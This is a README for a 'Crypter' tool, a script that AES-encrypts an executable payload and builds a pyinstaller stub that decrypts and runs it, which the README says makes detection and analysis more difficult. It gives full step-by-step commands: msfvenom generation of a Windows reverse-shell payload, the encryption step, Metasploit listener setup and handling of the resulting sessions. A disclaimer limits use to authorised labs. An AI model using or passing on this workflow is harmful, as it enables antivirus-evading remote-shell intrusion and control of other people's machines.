# Crypter

## 🔹Description
This script encrypts an executable (payload) using AES encryption and generates a decryption stub. The stub decrypts and executes the payload, making detection and analysis more difficult. It is designed for educational purposes and security research.

## 🛠 Features
- Encrypts a given executable using AES in CTR mode.
- Generates a Python stub that decrypts and executes the payload.
- Uses `pyinstaller` to create a standalone executable.

## 🚀 How It Works
1. The script reads the `shell.exe` file (payload).
2. Encrypts it using AES encryption.
3. Generates a stub script (`stub.py`) containing the encrypted payload.
4. Converts `stub.py` into an executable using `pyinstaller`.
5. When executed, the stub decrypts the payload and runs it.

## 📌 Requirements
- Python 3
- `pyaes` module
- `pyinstaller`
- Metasploit Framework (for payload generation and listener)

## 🔧 Installation
```bash
pip install pyaes pyinstaller
```

## 📦 Usage
### 1️⃣ Generate the Payload
Use `msfvenom` to create a reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=<your_ip> lport=443 -f exe > shell.exe
```
Place the `shell.exe` file in the script's directory.

### 2️⃣ Encrypt the Payload
Run the script:
```bash
python crypto.py
```
It will generate `stub.py` and convert it into an executable inside the `dist` folder.

### 3️⃣ Start Metasploit Listener
Open Metasploit and set up the listener:
```bash
msfconsole
use multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost <your_ip>
set lport 443
set exitonsession 0
exploit -j
```

### 4️⃣ Execute the Stub
Run the generated executable (`dist/stub.exe`). This will decrypt and execute the payload. If successful, you will receive a session in Metasploit.

### 5️⃣ Manage Sessions
- View active sessions:
  ```bash
  sessions
  ```
- Interact with a session:
  ```bash
  sessions <id>
  ```

## ⚠ Disclaimer
Use this script only in controlled environments such as penetration testing labs, with explicit permission. Misuse of this tool for unauthorized access to systems is illegal and may result in severe consequences. **The risk is yours**.


